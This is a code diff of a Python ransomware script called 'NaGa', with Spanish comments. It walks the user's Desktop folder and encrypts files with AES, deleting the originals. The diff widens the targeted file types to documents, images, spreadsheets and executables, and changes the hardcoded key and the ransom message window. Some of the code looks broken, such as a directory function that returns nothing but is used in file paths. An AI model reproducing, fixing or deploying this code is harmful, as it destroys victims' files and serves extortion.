@@ -1,48 +1,47 @@
+from importlib.resources import path
 import os
+from pathlib import Path
 import glob
 import pyaes
-from pathlib import Path
 import tkinter as tk
-from tkinter import ttk
+
 
 EXTENSION = ".NaGa"
 
-extensiones = ["*.txt"]
+extensiones = ["*.txt", "*.pdf", "*.exe", "*.xlsx", "*.docx", "*.xls", "*.xml", "*.cpp", "*.doc", "*.jpg", "*.png"]
 char = "."
 
-
-#Rutas las cuales atacara
-def rutas():
-    path = Path.home() / "Escritorio"
+def rutas(dir):
+    path = Path.home() / dir
     return path
 
-
-#Cambi de directorio a la de las funciones de arriba
-def cambiarRuta():
+def cambiar_ruta():
     try:
         ruta = rutas()
         return ruta
     except Exception:
         pass
 
-directorios = os.listdir(rutas())
+def directorios():
+    directorios = os.listdir(rutas("Escritorio"))
+    return directorios
 
-for dires in directorios:
-    os.chdir(cambiarRuta())
-
-print(directorios)
-
+def recorrer_dir():
+    for dires in directorios():
+        if not os.path.isdir(dires):
+            os.chdir(str(rutas("Escritorio"))+"/"+dires) #"Escritorio es la ruta que va a encriptar con sus subdirectorios"
+            print(os.getcwd())
 
 def encriptar():
     for archivos in extensiones:
         for archivoFor in glob.glob(archivos):
             print(archivoFor)
-            f = open(f'{cambiarRuta()}/{archivoFor}', 'rb')
+            f = open(f'{recorrer_dir()}/{archivoFor}', 'rb')
             datosAr = f.read()
             f.close()
 
-            os.remove(f'{cambiarRuta()}/{archivoFor}')
-            key = "abcdefghij"
+            os.remove(f'{recorrer_dir()}/{archivoFor}')
+            key = "Azrael"
             aes = pyaes.AESModeOfOperationCTR(key)
             datosEncriptados = aes.encrypt(datosAr)
 
@@ -51,16 +50,13 @@ def encriptar():
             nuevoAr.write(datosEncriptados)
             nuevoAr.close()
 
-
 if __name__ == "__main__":
     encriptar()
-
     window = tk.Tk()
     window.title("NaGa")
 
-    label = tk.Label(window, text="[Tus archivos han sido encriptados por NaGa]\n\n 'Las almas de los muertos tienen que ser conducidas a ser juzgadas' \n\nIntentos restantes: 17",
-                    bg='black', bd=100, fg="cyan", font="Terminal")
-
+    label = tk.Label(window, text="[Tus archivos han sido encriptados por NaGa]\n\n 'El arma mas poderosa siempre sera el conocimiento'",
+                    bg='black', bd=100, fg="pink", font="Terminal")
     label.pack()
     window.resizable(False, False)
     def cerraVen():
